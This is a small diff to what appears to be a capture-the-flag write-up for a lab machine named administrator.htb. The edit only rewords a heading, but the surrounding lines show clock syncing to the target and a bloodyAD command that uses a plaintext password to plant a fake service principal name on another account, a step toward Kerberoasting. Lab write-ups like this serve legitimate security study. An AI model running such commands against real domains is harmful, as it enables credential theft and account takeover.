@@ -375,7 +375,7 @@ sudo timedatectl set-ntp off
 sudo rdate -n $T
 ```
 
-Inject the `SPN`
+Inject the fake  `SPN`
 
 ```
 bloodyAD -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --host 10.129.160.52 set object Ethan servicePrincipalName -v 'falso/servicio'
